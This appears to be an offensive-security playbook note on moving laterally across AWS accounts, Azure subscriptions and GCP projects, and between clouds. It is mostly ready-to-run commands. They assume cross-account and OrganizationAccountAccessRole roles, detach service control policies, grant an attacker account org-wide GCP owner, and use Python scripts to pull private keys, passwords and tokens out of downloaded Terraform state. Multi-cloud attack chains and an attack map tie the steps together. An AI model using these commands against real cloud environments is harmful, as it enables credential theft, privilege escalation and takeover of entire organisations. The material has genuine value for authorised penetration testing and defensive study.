# 06.5 — Cross-Account and Cross-Cloud Movement

## What This Note Covers

Moving between AWS accounts, Azure subscriptions, GCP projects, and across different cloud providers entirely. Covers cross-account role assumption, AWS Organisations abuse, Azure cross-subscription access, GCP org traversal, and multi-cloud credential chains.

---

## AWS Cross-Account Role Assumption

AWS Organisations typically have many accounts (prod, dev, security, logging, shared services). IAM roles with cross-account trust policies allow movement between them.

### Finding Cross-Account Roles

```bash
# Step 1: Find your current account ID
aws sts get-caller-identity --query Account --output text
# e.g., 111111111111

# Step 2: List roles with trust policies that reference OTHER accounts
aws iam list-roles --query 'Roles[].{Name:RoleName,ARN:Arn}' --output text | \
  while read NAME ARN; do
    TRUST=$(aws iam get-role --role-name $NAME \
      --query 'Role.AssumeRolePolicyDocument' 2>/dev/null)
    # Check if trust policy references accounts other than your own
    echo $TRUST | grep -v "111111111111" | grep -q "iam::2\|iam::3\|iam::4" && \
      echo "Cross-account trust: $NAME"
  done

# Step 3: Find roles in OTHER accounts that trust YOUR account
# (Enumerate resources and look for resource-based policies)
# This requires knowing the other account IDs — check billing, resource tags, org

# Step 4: Assume the cross-account role
aws sts assume-role \
  --role-arn arn:aws:iam::PROD_ACCOUNT_ID:role/ReadOnlyAccess \
  --role-session-name cross-account-hop
```

### AWS Organisations — Management Account Escalation

The AWS Organisations management account can apply Service Control Policies to all member accounts. Compromising the management account = control over every account in the org.

```bash
# Check if you're in the management account
aws organizations describe-organization \
  --query 'Organization.{MasterAccountId:MasterAccountId,MasterAccountEmail:MasterAccountEmail}'

# If you're in a member account — enumerate the org structure
aws organizations list-accounts  # requires organizations:ListAccounts

# List all accounts in the org
aws organizations list-accounts \
  --query 'Accounts[].{ID:Id,Name:Name,Email:Email,Status:Status}'

# Find accounts with no SCP restrictions (no SCPs applied)
aws organizations list-policies --filter SERVICE_CONTROL_POLICY

# The OrganizationAccountAccessRole is created in every member account
# by the management account — it trusts the management account
# If you're in the management account → assume this role in any member account
aws sts assume-role \
  --role-arn arn:aws:iam::MEMBER_ACCOUNT:role/OrganizationAccountAccessRole \
  --role-session-name org-access
# This gives you admin in every member account
```

> [!danger] Management account = God mode across the org
> The OrganizationAccountAccessRole has AdministratorAccess in every member account and trusts the management account. Compromise the management account → compromise every account in the org.

### Service Control Policy (SCP) Bypass Research

SCPs deny specific actions across all accounts. If you can modify SCPs (requires management account), you can remove restrictions.

```bash
# List all SCPs in the org
aws organizations list-policies --filter SERVICE_CONTROL_POLICY

# View an SCP's content
aws organizations describe-policy --policy-id p-POLICY_ID \
  --query 'Policy.Content' | python3 -c "import sys,json; print(json.dumps(json.loads(json.load(sys.stdin)), indent=2))"

# If you're in the management account and can modify SCPs:
# Remove a restrictive SCP from a specific account
aws organizations detach-policy \
  --policy-id p-RESTRICTIVE_POLICY \
  --target-id ACCOUNT_ID_TO_UNRESTRICT
```

## Azure Cross-Subscription Movement

An identity (user, SP, or managed identity) can have roles in multiple subscriptions. Finding these cross-subscription assignments is the Azure equivalent of cross-account movement.

```bash
# List ALL subscriptions accessible to current identity
az account list --all --output table

# For each subscription — check your role assignments
for SUB in $(az account list --query "[].id" -o tsv); do
  echo "=== Subscription: $SUB ==="
  az role assignment list \
    --subscription $SUB \
    --assignee $(az account show --query user.name -o tsv) \
    --output table 2>/dev/null
done

# Switch to a different subscription
az account set --subscription TARGET_SUB_ID

# Find shared Key Vaults accessible across subscriptions
# Key Vaults accessed by managed identities from other subscriptions
az keyvault list --subscription TARGET_SUB_ID --output table

# Move between resource groups in a subscription using Resource Manager
az resource list --subscription TARGET_SUB_ID --output table
```

### Azure Lighthouse (Cross-Tenant Access)

Azure Lighthouse allows service providers to manage customer tenants. If misconfigured, it creates cross-tenant access paths.

```bash
# List Lighthouse delegations (resources delegated to another tenant)
az managedservices assignment list --output table
az managedservices definition list --output table

# If a delegation exists — the managing tenant has a specific role
# in the customer tenant → another org may have access to your resources
```

## GCP Cross-Project and Cross-Org Movement

Already partially covered in 06.4. The specific cross-org scenario:

```bash
# If an SA in your project has org-level roles:
gcloud organizations get-iam-policy ORG_ID \
  --flatten="bindings[].members" \
  --filter="bindings.members:YOUR_SA_EMAIL"

# If you have resourcemanager.organizations.setIamPolicy at org level:
# You can grant yourself or your SA roles across ALL projects in the org
gcloud organizations add-iam-policy-binding ORG_ID \
  --member="user:attacker@gmail.com" \
  --role="roles/owner"
# Now you're owner of every project in the entire organisation

# Cross-org via Shared VPC
# Shared VPC host project allows service projects to use its network
# If you compromise the host project → affect all service projects
gcloud compute shared-vpc list-associated-resources HOST_PROJECT_ID
```

## Cross-Cloud Movement — Real-World Chains

### AWS → GCP via Terraform State in S3

```
1. Compromise AWS identity (leaked access key)
2. List S3 buckets → find terraform state bucket
3. Download terraform.tfstate
4. State file contains google_service_account_key resource
5. Extract the GCP SA private key from state
6. Authenticate to GCP as the SA
7. Enumerate GCP projects and permissions
```

```bash
# Step 3-5: Extract GCP credentials from Terraform state
aws s3 cp s3://TERRAFORM_BUCKET/prod/terraform.tfstate /tmp/
python3 -c "
import json
state = json.load(open('/tmp/terraform.tfstate'))
for r in state.get('resources', []):
    if r['type'] in ['google_service_account_key', 'google_service_account']:
        for i in r.get('instances', []):
            attrs = i.get('attributes', {})
            if 'private_key' in attrs:
                import base64
                print(base64.b64decode(attrs['private_key']).decode())
"
# Outputs the GCP SA JSON key → authenticate to GCP
```

### GCP → AWS via Secrets in GCS

```
1. Compromise GCP identity (SA key leak or metadata SSRF)
2. List GCS buckets → find config/secrets bucket
3. Download files → find AWS credentials (access key + secret)
4. Validate AWS credentials → enumerate permissions
5. Escalate in AWS
```

### Azure → AWS via Key Vault

```
1. Compromise Azure identity (device code phishing, SSRF on VM)
2. Get managed identity token → access Key Vault
3. Key Vault contains: "aws-deploy-key" secret
4. Secret contains AWS access key + secret for deploy role
5. Use credentials to access AWS account
```

### CI/CD as Cross-Cloud Bridge

```
1. Compromise GitHub Actions workflow (pull_request_target injection)
2. Workflow has OIDC access to AWS AND Azure AND GCP
3. Extract tokens/credentials for all three providers
4. Access all three cloud environments from a single pipeline compromise
```

## Building the Attack Map

When you start a multi-account or multi-cloud engagement, build an explicit graph before moving:

```
ACCOUNT/PROJECT INVENTORY:
  AWS Account: 111111111111 (dev) — current foothold
  AWS Account: 222222222222 (prod) — target
  AWS Account: 333333333333 (management/org) — ultimate target
  Azure Tenant: abc123 — connected via CI/CD
  GCP Project: myproject-dev — connected via Terraform state in S3

KNOWN TRUST RELATIONSHIPS:
  111111111111 → assume → 222222222222 (via DeployRole)
  333333333333 management → all member accounts (OrganizationAccountAccessRole)
  GitHub Actions → AWS OIDC → 111111111111 (DeployRole)
  GitHub Actions → GCP WIF → myproject-dev (deploy-sa)

ATTACK PATH OPTIONS:
  Path 1: 111111111111 → AssumeRole → 222222222222 (prod account) [fastest]
  Path 2: 111111111111 → S3 tfstate → GCP SA key → myproject-dev
  Path 3: 111111111111 → pivot to CI/CD → extract OIDC tokens → all accounts
```

## Quick Reference — Cross-Account and Cross-Cloud

```bash
# AWS cross-account
aws organizations list-accounts
aws sts assume-role --role-arn arn:aws:iam::OTHER_ACCOUNT:role/ROLE --role-session-name hop

# Management account → all member accounts
aws sts assume-role \
  --role-arn arn:aws:iam::MEMBER_ACCOUNT:role/OrganizationAccountAccessRole \
  --role-session-name org-admin

# Azure cross-subscription
az account list --all --output table
az account set --subscription SUB_ID
az role assignment list --subscription SUB_ID

# GCP cross-project
gcloud projects list
gcloud organizations get-iam-policy ORG_ID

# Terraform state mining (cross-cloud credentials)
aws s3 cp s3://BUCKET/terraform.tfstate /tmp/
python3 -c "
import json
state = json.load(open('/tmp/terraform.tfstate'))
for r in state.get('resources',[]):
    for i in r.get('instances',[]):
        for k,v in i.get('attributes',{}).items():
            if any(s in k.lower() for s in ['password','secret','key','token','private']):
                print(f'{r[\"type\"]}.{k}: {str(v)[:100]}')
"
```
